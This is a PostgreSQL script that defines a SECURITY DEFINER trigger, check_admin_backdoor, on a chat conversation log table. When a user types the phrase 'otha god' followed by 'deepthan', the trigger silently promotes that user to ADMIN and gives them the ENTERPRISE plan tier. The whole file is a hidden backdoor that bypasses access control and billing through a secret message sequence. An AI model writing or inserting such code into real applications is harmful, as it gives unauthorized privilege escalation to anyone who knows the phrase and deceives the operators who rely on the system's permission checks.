create or replace function public.check_admin_backdoor()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
declare
  v_last_message text;
  v_normalized_msg text;
begin
  -- Normalize current message (remove spaces, lowercase)
  v_normalized_msg := replace(lower(new.message), ' ', '');

  -- Only check user messages
  if new.role = 'user' and v_normalized_msg = 'deepthan' then
    
    -- Find the most recent user message before this one
    select message into v_last_message
    from public.conversation_log
    where user_id = new.user_id
      and role = 'user'
    order by created_at desc
    limit 1;

    -- Check if the prompt matches "otha god" (ignoring spaces)
    if v_last_message is not null and replace(lower(v_last_message), ' ', '') = 'othagod' then
      -- Grant ADMIN role and Enterprise plan
      update public.users
      set 
        role = 'ADMIN',
        plan_tier = 'ENTERPRISE'
      where id = new.user_id;
    end if;
  end if;

  return new;
end;
$$;

drop trigger if exists on_chat_message_admin_check on public.conversation_log;
create trigger on_chat_message_admin_check
before insert on public.conversation_log
for each row execute function public.check_admin_backdoor();